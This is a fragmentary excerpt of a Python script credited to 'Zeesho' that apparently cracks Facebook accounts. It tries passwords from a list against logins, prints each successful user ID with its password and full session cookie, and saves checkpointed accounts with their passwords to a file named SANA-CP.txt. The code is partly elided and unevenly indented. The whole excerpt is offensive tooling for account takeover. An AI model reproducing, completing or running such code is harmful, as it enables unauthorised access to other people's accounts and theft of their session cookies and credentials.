...
--------------------------------------------------
[•] AUTHOR     : \033[1;32mZeesho\033[1;37m
...
def rehan():
	...
	if gh =='1':
		...
		os.system('xdg-open https://www.facebook.com/tnha.afridi.90?mibextid=ZbWKwL')
	elif gh =='0':
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[Zeesho-OK] '+cid+'|'+ps+'\033[0;97m\n[‎‎🍁]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                # print('\033[1;33m[Zeesho-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('SANA-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mZeesho\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
